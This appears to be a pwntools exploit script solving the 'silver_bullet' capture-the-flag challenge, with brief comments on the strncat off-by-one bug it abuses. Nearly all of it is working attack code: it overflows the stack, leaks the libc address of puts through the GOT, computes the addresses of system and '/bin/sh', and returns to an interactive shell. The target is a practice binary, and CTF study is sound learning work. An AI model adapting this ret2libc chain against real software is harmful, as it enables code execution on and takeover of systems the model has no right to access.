from pwn import *
#io = process('./silver_bullet')
#context.log_level = 'debug'
#pause()

def create(desc):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('Give me your description of bullet :')
    io.send(desc)

def power(desc):
    io.recvuntil('Your choice :')
    io.sendline('2')
    io.recvuntil('Give me your another description of bullet :')
    io.send(desc)

def beat():
    io.recvuntil('Your choice :')
    io.sendline('3')

create('a' * 47)
power('a')
puts_plt = 0x80484a8
main = 0x8048954
puts_got = 0x804afdc

power(p32(0xffffffff) + 'bbb' + p32(puts_plt) + p32(main) + p32(puts_got))
beat()
io.recvuntil('Oh ! You win !!\n')
puts_libc = u32(io.recvn(4))
log.info('puts_libc :' + hex(puts_libc))
l = ELF("/tmp/libc")
system_libc = puts_libc - l.symbols['puts'] + l.symbols['system']
binsh = puts_libc - l.symbols['puts'] + l.search('/bin/sh').next()

create('a' * 47)
power('a')
power(p32(0xffffffff) + 'bbb' + p32(system_libc) + p32(0xdeadbeef) + p32(binsh))
beat()

io.interactive()

# this stack overflow caused because it used strncat
# strncat will put a \x00 at the end of the buf it strncated
# the s.power is right behind the s.buf, so the s.power will be overwrited
# so we get a stack overflow

